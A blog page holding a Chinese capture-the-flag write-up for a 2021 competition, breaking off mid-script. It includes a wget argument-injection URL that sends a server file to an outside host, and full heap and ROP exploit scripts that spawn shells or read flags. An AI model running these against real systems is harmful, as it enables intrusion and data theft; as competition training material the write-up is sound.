@@ -1,0 +1,907 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>陇原战&#34;疫&#34;2021网络安全大赛Writeup | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="陇原战&#34;疫&#34;2021网络安全大赛Writeup | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="Web
+CheckIN
+源代码的这两处：
+
+
+先尝试访问/wget：/wget?argv=a，看出来这里应该是可以进行攻击的了
+
+接着尝试利用wget的--post-file进行数据外带，读取源代码
+在自己VPS开个监听并且构造：
+/wge..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              陇原战&#34;疫&#34;2021网络安全大赛Writeup
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-11-08
+              </span>
+              <span>
+                20 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="web">Web</h1>
+<h2 id="checkin">CheckIN</h2>
+<p>源代码的这两处：</p>
+<figure data-type="image" tabindex="1"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/08/bb834f8aca0e8.png" alt="1636352891856.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/08/9a766db861be8.png" alt="1636352905106.png" loading="lazy"></figure>
+<p>先尝试访问/wget：<code>/wget?argv=a</code>，看出来这里应该是可以进行攻击的了</p>
+<figure data-type="image" tabindex="3"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/08/807f04c7e8c15.png" alt="1636352921819.png" loading="lazy"></figure>
+<p>接着尝试利用wget的<code>--post-file</code>进行数据外带，读取源代码</p>
+<p>在自己VPS开个监听并且构造：</p>
+<pre><code>/wget?argv=a&amp;argv=--post-file&amp;argv=/flag&amp;argv=http://1.14.92.24:8008/
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/08/29ce0ab6656c3.png" alt="1636352940193.png" loading="lazy"></figure>
+<p>拿到flag：</p>
+<pre><code>flag{6e6f4abf-f38c-4d30-8ccd-e0bc0012a13f}
+</code></pre>
+<h1 id="misc">Misc</h1>
+<h2 id="打败病毒">打败病毒</h2>
+<p>下载附件，发现是MC，根据描述来看应该是杀掉BOSS之后就能获得flag</p>
+<figure data-type="image" tabindex="5"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/07/7c5793073db1c.png" alt="1636276893744.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/07/bd31b5e3138f1.png" alt="1636276850002.png" loading="lazy"></figure>
+<p>进入游戏，首先肯定是要给自己来称手一把好剑啦，直接输入指令<code>/give @p minecraft:diamond_sword 1 0 {ench:[{id:16,lvl:32727}]}</code>，想获得附魔的钻石剑，但是提示权限不过，应该是这个mod禁用了作弊。</p>
+<p>但是这难不倒咱们老MC玩家了，直接选择对局域网开放，并且勾选上允许作弊，游戏模式选择创造模式，然后就能输入刚才的指令获得钻石剑了</p>
+<figure data-type="image" tabindex="7"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/07/0b542aba6a80c.png" alt="1636277328934.png" loading="lazy"></figure>
+<p>这里是有一个穿越的门的，跳进去就会到另外一个时空，里面是有boss的，但是进去了之后我们在一个平台上，到达不了龙的位置，所以要进入创造模式，输入<code>/gamemode 1</code>，现在双击空格就能飞起来了</p>
+<figure data-type="image" tabindex="8"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/07/6edd9fda530ed.png" alt="1636277663008.png" loading="lazy"></figure>
+<p>对着这条龙就是一刀斩！打死了之后有个墓碑，看起来也是一个传送门</p>
+<figure data-type="image" tabindex="9"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/07/e8a6bc38e0696.png" alt="1636277716478.png" loading="lazy"></figure>
+<p>进去之后，就提醒通关了，然后给了一串base编码</p>
+<figure data-type="image" tabindex="10"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/07/f7691c1089c99.png" alt="1636278369702.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/07/ae029d6e33f6b.png" alt="1636277866673.png" loading="lazy"></figure>
+<p>通过base62解码得到flag</p>
+<figure data-type="image" tabindex="12"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/07/4415cbf821d26.png" alt="1636277908814.png" loading="lazy"></figure>
+<p>flag为：</p>
+<pre><code>SETCTF{Fi9ht1ng_3ItH_V1rUs}
+</code></pre>
+<h2 id="soeasycheckin">soEasyCheckin</h2>
+<p>下载附件得到一串base编码，但是直接解开会乱码，仔细观察发现其中夹杂着一个<code>$</code>符号</p>
+<figure data-type="image" tabindex="13"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/07/acfcd9b82f382.png" alt="1636291122251.png" loading="lazy"></figure>
+<p>于是尝试去解前半部分的base，发现是base32</p>
+<figure data-type="image" tabindex="14"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/07/ba88ee71611f6.png" alt="1636278138985.png" loading="lazy"></figure>
+<pre><code class="language-hex">e5b9b3e7ad89e5928ce8b090e887aae794b1e5b9b3e7ad89e5b9b3e7ad89e887aae794b1e6b395e6b2bbe58f8be59684e5b9b3e7ad89e5b9b3e7ad89e6b091e4b8bbe585ace6ada3e695ace4b89ae5928ce8b090e69687e6988ee5b9b3e7ad89e788b1e59bbde585ace6ada3e695ace4b89ae585ace6ada3e8af9ae4bfa1e887aae794b1e5928ce8b090e6b091e4b8bbe5b9b3e7ad89e788b1e59bbde585ace6ada3e695ace4b89ae585ace6ada3e5b9b3e7ad89e5928ce8b090e69687e6988ee887aae794b1e58f8be59684e585ace6ada3e585ace6ada3e695ace4b89ae5928ce8b090e887aae794b1e69687e6988ee58f8be59684e6b395e6b2bbe887aae794b1e58f8be59684e585ace6ada3e585ace6ada3e58f8be59684e695ace4b89ae585ace6ada3e8af9ae4bfa1e887aae794b1e585ace6ada3e6b395e6b2bbe5928ce8b090e5928ce8b090e5b9b3e7ad89e695ace4b89ae6b395e6b2bbe5b9b3e7ad89e585ace6ada3e6b091e4b8bbe585ace6ada3e8af9ae4bfa1e887aae794b1e5928ce8b090e69688
+</code></pre>
+<p>hex解码得到：</p>
+<pre><code class="language-社会主义核心价值观">平等和谐自由平等平等自由法治友善平等平等民主公正敬业和谐文明平等爱国公正敬业公正诚信自由和谐民主平等爱国公正敬业公正平等和谐文明自由友善公正公正敬业和谐自由文明友善法治自由友善公正公正友善敬业公正诚信自由公正法治和谐和谐平等敬业法治平等公正民主公正诚信自由和谐
+</code></pre>
+<p>核心价值观解码报错了，最后发现把最后的和谐两个字去除就行了</p>
+<figure data-type="image" tabindex="15"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/07/7a323772a5418.png" alt="1636278238043.png" loading="lazy"></figure>
+<p>解码得到前半部分得flag：</p>
+<pre><code>SET{Qi2Xin1Xie2Li4-Long3Yuan
+</code></pre>
+<p>后半部分同样是base32，按道理来说可以直接解开，但是这里乱码了，原因是长度不够，于是在前面添上777</p>
+<figure data-type="image" tabindex="16"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/07/e8c85edbfcc65.png" alt="1636278592676.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="17"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/07/d1dbbfcdc1210.png" alt="1636278686232.png" loading="lazy"></figure>
+<p>可以得到：</p>
+<pre><code class="language-hex">6988ee5b9b3e7ad89e58f8be59684e887aae794b1e585ace6ada3e788b1e59bbde585ace6ada3e6b091e4b8bbe585ace6ada3e58f8be59684e788b1e59bbde5928ce8b090e887aae794b1e5b9b3e7ad89e695ace4b89ae585ace6ada3e695ace4b89ae5928ce8b090e887aae794b1e6b395e6b2bbe8af9ae4bfa1e5928ce8b090
+</code></pre>
+<p>这里hex解码又是乱码，把第一个6删掉，再解码得到<code>平等友善自由公正爱国公正民主公正友善爱国和谐自由平等敬业公正敬业和谐自由法治诚信和谐</code></p>
+<figure data-type="image" tabindex="18"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/07/b771c870d5499.png" alt="1636279137317.png" loading="lazy"></figure>
+<p>再解码得到<code>Zhan4Yi4}</code>,但是注意少了一个数字，因为每一个拼音后面都有一个数字，在前半段</p>
+<p>flag<code>SET{Qi2Xin1Xie2Li4-Long3Yuan</code>中的Yuan后面肯定是有一个数字的，经过一个一个试，最终得到是2</p>
+<p>所以完整flag为：</p>
+<pre><code>SET{Qi2Xin1Xie2Li4-Long3Yuan2Zhan4Yi4}
+</code></pre>
+<h2 id="sos">SOS</h2>
+<p>下载附件，又是MC，这次不是打怪了，这次一进去，就听到了拨号的音，然后旁边是 很多按钮，通过踩下这些按钮，旁边就落下来一些东西</p>
+<figure data-type="image" tabindex="19"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/07/068dc208eece6.png" alt="1636283909722.png" loading="lazy"></figure>
+<p>通过这些就可以猜想 通过DTMF的脚本来识别这段拨号音频，得到按键的循序，通过这个顺序依次踩下按钮，用手机将音频录制下来，然后转为wav格式的音频</p>
+<p>DTMF脚本地址：https://github.com/ribt/dtmf-decoder</p>
+<p>DTMF脚本：</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+
+import numpy as np
+import matplotlib.pyplot as plt
+from scipy.io import wavfile
+import argparse
+
+dtmf = {(697, 1209): &quot;1&quot;, (697, 1336): &quot;2&quot;, (697, 1477): &quot;3&quot;, (770, 1209): &quot;4&quot;, (770, 1336): &quot;5&quot;, (770, 1477): &quot;6&quot;,
+        (852, 1209): &quot;7&quot;, (852, 1336): &quot;8&quot;, (852, 1477): &quot;9&quot;, (941, 1209): &quot;*&quot;, (941, 1336): &quot;0&quot;, (941, 1477): &quot;#&quot;,
+        (697, 1633): &quot;A&quot;, (770, 1633): &quot;B&quot;, (852, 1633): &quot;C&quot;, (941, 1633): &quot;D&quot;}
+
+parser = argparse.ArgumentParser(description=&quot;Extract phone numbers from an audio recording of the dial tones.&quot;)
+parser.add_argument(&quot;-v&quot;, &quot;--verbose&quot;, help=&quot;show a complete timeline&quot;, action=&quot;store_true&quot;)
+parser.add_argument(&quot;-l&quot;, &quot;--left&quot;, help=&quot;left channel only (if the sound is stereo)&quot;, action=&quot;store_true&quot;)
+parser.add_argument(&quot;-r&quot;, &quot;--right&quot;, help=&quot;right channel only (if the sound is stereo)&quot;, action=&quot;store_true&quot;)
+parser.add_argument(&quot;-d&quot;, &quot;--debug&quot;, help=&quot;show graphs to debug&quot;, action=&quot;store_true&quot;)
+parser.add_argument(&quot;-t&quot;, type=int, metavar=&quot;F&quot;, help=&quot;acceptable frequency error (in hertz, 20 by default)&quot;,
+                    default=20)
+parser.add_argument(&quot;-i&quot;, type=float, metavar='T', help=&quot;process by T seconds intervals (0.04 by default)&quot;,
+                    default=0.04)
+
+parser.add_argument('file', type=argparse.FileType('r'))
+
+args = parser.parse_args()
+
+file = args.file.name
+try:
+    fps, data = wavfile.read(file)
+except FileNotFoundError:
+    print(&quot;No such file:&quot;, file)
+    exit()
+except ValueError:
+    print(&quot;Impossible to read:&quot;, file)
+    print(&quot;Please give a wav file.&quot;)
+    exit()
+
+if args.left and not args.right:
+    if len(data.shape) == 2 and data.shape[1] == 2:
+        data = np.array([i[0] for i in data])
+    elif len(data.shape) == 1:
+        print(&quot;Warning: The sound is mono so the -l option was ignored.&quot;)
+    else:
+        print(&quot;Warning: The sound is not mono and not stereo (&quot; + str(
+            data.shape[1]) + &quot; canals)... so the -l option was ignored.&quot;)
+
+
+elif args.right and not args.left:
+    if len(data.shape) == 2 and data.shape[1] == 2:
+        data = np.array([i[1] for i in data])
+    elif len(data.shape) == 1:
+        print(&quot;Warning: the sound is mono so the -r option was ignored.&quot;)
+    else:
+        print(&quot;Warning: The sound is not mono and not stereo (&quot; + str(
+            data.shape[1]) + &quot; canals)... so the -r option was ignored.&quot;)
+
+else:
+    if len(data.shape) == 2:
+        data = data.sum(axis=1)  # stereo
+
+precision = args.i
+
+duration = len(data) / fps
+
+step = int(len(data) // (duration // precision))
+
+debug = args.debug
+verbose = args.verbose
+c = &quot;&quot;
+
+if debug:
+    print(
+        &quot;Warning:\nThe debug mode is very uncomfortable: you need to close each window to continue.\nFeel free to kill the process doing CTRL+C and then close the window.\n&quot;)
+
+if verbose:
+    print(&quot;0:00 &quot;, end='', flush=True)
+
+try:
+    for i in range(0, len(data) - step, step):
+        signal = data[i:i + step]
+
+        if debug:
+            plt.subplot(311)
+            plt.subplots_adjust(hspace=0.5)
+            plt.title(&quot;audio (entire signal)&quot;)
+            plt.plot(data)
+            plt.xticks([])
+            plt.yticks([])
+            plt.axvline(x=i, linewidth=1, color='red')
+            plt.axvline(x=i + step, linewidth=1, color='red')
+            plt.subplot(312)
+            plt.title(&quot;analysed frame&quot;)
+            plt.plot(signal)
+            plt.xticks([])
+            plt.yticks([])
+
+        frequencies = np.fft.fftfreq(signal.size, d=1 / fps)
+        amplitudes = np.fft.fft(signal)
+
+        # Low
+        i_min = np.where(frequencies &gt; 0)[0][0]
+        i_max = np.where(frequencies &gt; 1050)[0][0]
+
+        freq = frequencies[i_min:i_max]
+        amp = abs(amplitudes.real[i_min:i_max])
+
+        lf = freq[np.where(amp == max(amp))[0][0]]
+
+        delta = args.t
+        best = 0
+
+        for f in [697, 770, 852, 941]:
+            if abs(lf - f) &lt; delta:
+                delta = abs(lf - f)
+                best = f
+
+        if debug:
+            plt.subplot(313)
+            plt.title(&quot;Fourier transform&quot;)
+            plt.plot(freq, amp)
+            plt.yticks([])
+            plt.annotate(str(int(lf)) + &quot;Hz&quot;, xy=(lf, max(amp)))
+
+        lf = best
+
+        # High
+        i_min = np.where(frequencies &gt; 1100)[0][0]
+        i_max = np.where(frequencies &gt; 2000)[0][0]
+
+        freq = frequencies[i_min:i_max]
+        amp = abs(amplitudes.real[i_min:i_max])
+
+        hf = freq[np.where(amp == max(amp))[0][0]]
+
+        delta = args.t
+        best = 0
+
+        for f in [1209, 1336, 1477, 1633]:
+            if abs(hf - f) &lt; delta:
+                delta = abs(hf - f)
+                best = f
+
+        if debug:
+            plt.plot(freq, amp)
+            plt.annotate(str(int(hf)) + &quot;Hz&quot;, xy=(hf, max(amp)))
+
+        hf = best
+
+        if debug:
+            if lf == 0 or hf == 0:
+                txt = &quot;Unknown dial tone&quot;
+            else:
+                txt = str(lf) + &quot;Hz + &quot; + str(hf) + &quot;Hz -&gt; &quot; + dtmf[(lf, hf)]
+            plt.xlabel(txt)
+
+        t = int(i // step * precision)
+
+        if verbose and t &gt; int((i - 1) // step * precision):
+            m = str(int(t // 60))
+            s = str(t % 60)
+            s = &quot;0&quot; * (2 - len(s)) + s
+            print(&quot;\n&quot; + m + &quot;:&quot; + s + &quot; &quot;, end='', flush=True)
+
+        if lf == 0 or hf == 0:
+            if verbose:
+                print(&quot;.&quot;, end='', flush=True)
+            c = &quot;&quot;
+        elif dtmf[(lf, hf)] != c or verbose:
+            c = dtmf[(lf, hf)]
+            print(c, end='', flush=True)
+
+        if debug:
+            plt.show()
+
+    print()
+
+except KeyboardInterrupt:
+    print(&quot;\nCTRL+C detected: exiting...&quot;)
+</code></pre>
+<p>使用终端命令：</p>
+<pre><code>python dtmf.py 1.wav
+</code></pre>
+<p>得到踩键的顺序后，依次踩下，即可得到flag</p>
+<figure data-type="image" tabindex="20"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/07/729b046dff247.png" alt="1636296606705.png" loading="lazy"></figure>
+<p>flag为：</p>
+<pre><code>SETCTF{C0M3_4nD_he1P_mE}
+</code></pre>
+<h1 id="pwn">PWN</h1>
+<h2 id="h3apclass">h3apclass：</h2>
+<p>首先分析题目，经典菜单题，不过没有show libc2.31</p>
+<p>漏洞点在edit中，因为使用的是strlen，因此造成溢出。</p>
+<p>leak_libc 部分: 通过溢出更改chunk的size为0x430直接进入unsorted bin</p>
+<p>然后再不断申请切割该unsorted bin 以达到unsorted bin 与 tcache重叠的效果，最后爆破一位 1/16 出stdout  leak出libc</p>
+<p>get_flag 部分 ：一开始用setcontext写的，但一直没有成。</p>
+<p>后面想用environ泄露出栈地址，但因为没有show失败，</p>
+<p>后来想到这个是题黑名单，只是禁用了execve。于是改free_hook为printf地址，然后给printf传入%15$p 泄露出栈上的地址，得到add函数的返回地址。</p>
+<p>最后直接把orw链打入add的ret地址处，打印出flag。</p>
+<p>exp ：</p>
+<pre><code class="language-python">from pwn import*
+
+context.log_level = &quot;debug&quot;
+
+io = process(&quot;./H3apClass&quot;)
+#io = remote(&quot;node4.buuoj.cn&quot;,&quot;28143&quot;)
+
+libc = ELF(&quot;./libc.so.6&quot;,checksec = 0)
+
+
+def fuck(choice):
+	io.sendlineafter(&quot;4:Drop homework\n&quot;,str(choice))
+
+def add(index,size,content):
+	fuck(1)
+	io.sendlineafter(&quot;Which homework?\n&quot;,str(index))
+	io.sendlineafter(&quot;size:\n&quot;,str(size))
+	io.sendlineafter(&quot;content:\n&quot;,content)
+
+def Add(index,size,content):
+	fuck(1)
+	io.sendlineafter(&quot;Which homework?\n&quot;,str(index))
+	io.sendlineafter(&quot;size:\n&quot;,str(size))
+	io.sendafter(&quot;content:\n&quot;,content)
+
+def edit(index,content):
+	fuck(3)
+	io.sendlineafter(&quot;Which homework?\n&quot;,str(index))
+	io.sendafter(&quot;content:\n&quot;,content)
+
+def delete(index):
+	fuck(4)
+	io.sendlineafter(&quot;Which homework?\n&quot;,str(index))
+
+def look():
+	global io
+	gdb.attach(io)
+
+&quot;&quot;&quot;
+def pwn():
+	#gdb.attach(io)
+	add(0,0x18,b&quot;0&quot;*0x18)
+	add(1,0xf8,b&quot;1&quot;*0xf8)
+	add(2,0xf8,b&quot;2&quot;*0xf8)
+	add(3,0xf8,b&quot;3&quot;*0xf8)
+	add(4,0xf8,b&quot;4&quot;*0xf8)
+	add(5,0x28,b&quot;a&quot;*0x28)
+	add(6,0xf8,b&quot;5&quot;*0xf8)
+	edit(5,b&quot;a&quot;*0x20 + p64(0x430) + p64(0x100))
+	edit(0,b&quot;a&quot;*0x10 + p64(0) + p64(0x430))
+	delete(6)
+	look()
+pwn()
+&quot;&quot;&quot;
+
+def pwn():
+	#gdb.attach(io)
+	add(0,0x18,b&quot;a&quot;*0x18)
+	add(1,0xf8,b&quot;wangwang1&quot;)
+	add(2,0xf8,b&quot;wangwang2&quot;)
+	add(3,0xf8,b&quot;wangwang2&quot;)
+	add(4,0xf8,b&quot;wangwang2&quot;)
+	add(5,0x28,&quot;fuck_libc&quot;)
+	delete(4)
+	add(4,0x18,&quot;eeeenb&quot;)
+	add(6,0x28,p64(0)+p64(0x21))
+	edit(0,b&quot;a&quot;*0x10+p64(0)+b&quot;\x51\x04&quot;)
+	delete(0)
+	delete(1)
+	for i in range(2,5):
+		delete(i)
+	for i in range(2,5):
+		add(i,0xe8,&quot;a&quot;)
+	for i in range(2,5):
+		delete(i)
+	delete(6)
+	delete(5)
+	add(2,0xd8,&quot;2&quot;)
+	add(3,0x48,b&quot;3&quot;)
+	Add(4,0x38,b&quot;\xa0\x36&quot;)
+	delete(2)
+	delete(3)
+	#pause()
+	add(2,0x28,&quot;0&quot;)
+	paylaod = p64(0xfbad1887)+p64(0)*3+b&quot;\x58&quot;
+	add(3,0x28,paylaod)
+	libc_base = u64(io.recvuntil(&quot;\x7f&quot;,timeout=0.1)[-6:].ljust(8,b'\x00'))-0x1ed4a0 # _IO_2_1_stderr_+216 store _IO_file_jumps
+	if libc_base == -0x1ed4a0:
+		exit(-1)
+	libc_base = libc_base - 0x7fcee3001afc + 0x7fcee3037000
+	success(&quot;libc_base:&quot;+hex(libc_base))
+	free_hook = libc_base + libc.sym[&quot;__free_hook&quot;]
+	system = libc_base  + libc.sym[&quot;system&quot;]
+	printf = libc_base + libc.sym[&quot;printf&quot;]
+	environ = libc_base + libc.sym[&quot;environ&quot;]
+	setcontext = libc_base + libc.sym[&quot;setcontext&quot;]
+
+	read = libc_base + libc.sym[&quot;read&quot;]
+	write = libc_base + libc.sym[&quot;write&quot;]
+	open = libc_base + libc.sym[&quot;open&quot;]
+	pop_rdi_ret = libc_base + 0x26b72
+	pop_rdx_r12 = libc_base + 0x11c371
+	pop_rsi_ret = libc_base +0x27529
+	pop_rax_ret = libc_base + 0x4a550
+	syscall_ret = read + 0xf
+	ret = libc_base + 0x25679 
+
+	success(&quot;free_hook:&quot;+hex(free_hook))
+	#look()
+	delete(4)
+	add(4,0x40,b&quot;a&quot;*0x40)
+	edit(4,p64(0)*5+p64(0x21)+p64(free_hook))
+	add(0,0x18,b&quot;%15$p&quot;)
+	add(6,0x18,p64(printf)+b&quot;flag&quot;+b&quot;\x00&quot;*4) 
+	delete(0)
+	info  = int(io.recv(14),16)
+	success(&quot;stack_addr:&quot;+hex(info)) #the_main_ret
+	add_ret = info - 0x7ffd26ceb5e8  + 0x7ffd26ceb4d8
+	success(&quot;add_ret:&quot;+hex(add_ret))
+	add(0,0xe0,p64(0)*4 + p64(add_ret))
+	delete(0)
+	delete(4) 
+	add(0,0xf8,b&quot;0&quot;)
+
+	flag_addr = free_hook + 0x8
+	orw = p64(pop_rdi_ret) + p64(flag_addr)
+	orw += p64(pop_rsi_ret) + p64(0) #The open arg2 = 0 -&gt; only read
+	#orw += p64(pop_rax_ret) + p64(2)
+	#orw += p64(syscall_ret)
+	orw += p64(open)
+	orw += p64(pop_rdi_ret) + p64(3)
+	orw += p64(pop_rsi_ret) + p64(flag_addr+0x8)
+	orw += p64(pop_rdx_r12) + p64(0x40) + p64(0)
+	orw += p64(read)
+	orw += p64(pop_rdi_ret) + p64(1);
+	orw += p64(write)
+
+	add(4,0xf8,orw)
+	io.recvuntil(&quot;flag&quot;)
+	sleep(100)
+	io.interactive()
+while True:
+	try :
+		#io = process(&quot;./H3apClass&quot;)
+		io = remote(&quot;node4.buuoj.cn&quot;,&quot;29896&quot;)
+		pwn()
+	except:
+		io.close
+		continue
+</code></pre>
+<figure data-type="image" tabindex="21"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/08/7bf9519f5e810.png" alt="1636352438093.png" loading="lazy"></figure>
+<h2 id="bbbaby">bbbaby:</h2>
+<p>首先分析题目，有两个功能，</p>
+<p>一个是可以对输入的地址指向进行edit，</p>
+<p>另外一个是可以对v5进行任意size的输入。</p>
+<p>于是很容易知道是需要通过v5溢出进行栈溢出攻击，但checksec后发现开了canary，又因为got表可改并且无PIE，所以可以把**_stack_chk_fail**的got表改为main，于是溢出V5打印puts地址后再次回到了main函数，然后再次改got表，通过改atoi_got为system，并传入/bin/sh\参数，getshell</p>
+<p>exp ：</p>
+<pre><code class="language-python">from pwn import*
+
+context.log_level = &quot;debug&quot;
+
+io = remote(&quot;node4.buuoj.cn&quot;,&quot;27853&quot;)
+elf = ELF('./pwn1',checksec = 0)
+libc = ELF('./libc-2.23.so',checksec = 0)
+
+pop_rdi_ret = 0x400a03
+main_addr = 0x40090B
+canary_check = 0x601020
+atoi_got = 0x601040
+offset = 0x110 + 0x8
+
+def chocie(c):
+	io.recvuntil(&quot;choice&quot;)
+	io.sendline(str(c))
+
+def pwn(size,content):
+	chocie(1)
+	io.recvuntil(&quot;:&quot;)
+	io.sendline(str(size))
+	io.recvuntil(&quot;:&quot;)
+	io.send(content)
+
+def edit_addr(addr,content):
+	chocie(0)
+	io.recvuntil(&quot;:&quot;)
+	io.sendline(addr)
+	io.recvuntil(&quot;:&quot;)
+	io.send(content)
+
+payload = p64(pop_rdi_ret) + p64(elf.got[&quot;puts&quot;])
+payload += p64(elf.plt['puts']) + p64(main_addr)
+
+edit_addr(str(canary_check),p64(main_addr))
+pwn(0x150,b&quot;a&quot;*offset + payload)
+chocie(5)
+chocie(5)
+
+#leak_libc and get shell
+puts = u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
+libc_base =puts - libc.sym['puts']
+system = libc_base + libc.sym['system']
+
+edit_addr(str(atoi_got),p64(system))
+io.sendline(b'/bin/sh\x00')
+
+io.interactive()
+</code></pre>
+<figure data-type="image" tabindex="22"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/08/0261044598e2c.png" alt="1636352422724.png" loading="lazy"></figure>
+<h2 id="magic">Magic：</h2>
+<p>刚拿到这个题比较懵逼，一堆大数，简直是吓坏孩子了。</p>
+<p>然后直接上gdb分析就是个模板题</p>
+<p>有 UAF，直接 fastbin attack可以打过去。</p>
+<p>leak_libc 部分 ： 填充8个a printf 顺带 main_arena+88c出来</p>
+<p>get_shell 部分 ： 直接fastbin_attack 打malloc_hook</p>
+<p>exp ：</p>
+<pre><code class="language-python">from pwn import *
+
+context.log_level = &quot;debug&quot;
+
+io = remote(&quot;node4.buuoj.cn&quot;,27312)
+
+elf = ELF(&quot;./Magic&quot;,checksec = 0)
+libc = ELF('libc-2.23.so',checksec = 0)
+one = [0x45226,0x4527a,0xf03a4,0xf1247]
+main_arena = 0x3c4b20
+
+def fuck(index):
+	io.recvuntil(&quot;Input your choice: &quot;)
+	io.sendline(str(index))
+	io.sendline('0')
+
+def add(index):
+	fuck(1)
+	io.sendline(str(index))
+	io.sendline('0')
+
+def edit(index,content):
+	fuck(2)
+	io.recvuntil(&quot;Input the idx&quot;)
+	io.sendline(str(index))
+	io.sendline('0')
+	io.recvuntil(&quot;Input the Magic&quot;)
+	io.send(content)	
+
+def delete(index):
+	fuck(3)
+	io.recvuntil(&quot;Input the idx&quot;)
+	io.sendline(str(index))
+	io.sendline('0')
+
+#leak_libc
+add(0)
+add(1)
+edit(0,b&quot;a&quot;*8)
+
+libc_base = u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00')) - 0x3c4d98
+realloc = libc_base + libc.sym['realloc']
+malloc_hook = libc_base + libc.sym['__malloc_hook']
+free_hook = libc_base + libc.sym[&quot;__free_hook&quot;]
+success(&quot;malloc_hook&quot;+hex(malloc_hook))
+one_gadget  = one[3] + libc_base
+
+#fuck the malloc_hook and libc_realloc
+delete(1)
+delete(0)
+edit(0,p64(malloc_hook - 0x23))
+add(0)
+add(1)
+payload = b'\x00'*11+p64(one_gadget)+p64(realloc+0x10)
+edit(1,payload)
+
+delete(0)
+delete(0)
+
+io.interactive()
+</code></pre>
+<figure data-type="image" tabindex="23"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/08/89ce957f196ed.png" alt="1636352409712.png" loading="lazy"></figure>
+<h1 id="crypto">Crypto</h1>
+<h2 id="mostlycommon">mostlycommon</h2>
+<p>seebug上有<a href="https://paper.seebug.org/1055/#rsa">ctf 密码学常见算法总结 (seebug.org)</a></p>
+<figure data-type="image" tabindex="24"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/08/a5b71c7a73907.png" alt="1636352860898.png" loading="lazy"></figure>
+<pre><code class="language-python"># -*- coding:utf-8 -*-
+from gmpy2 import invert
+def gongmogongji(n, c1, c2, e1, e2):
+    def egcd(a, b):
+        if b == 0:
+            return a, 0
+        else:
+            x, y = egcd(b, a % b)
+            return y, x - (a // b) * y
+    s = egcd(e1, e2)
+    s1 = s[0]
+    s2 = s[1]
+
+    # 求模反元素
+    if s1 &lt; 0:
+        s1 = - s1
+        c1 = invert(c1, n)
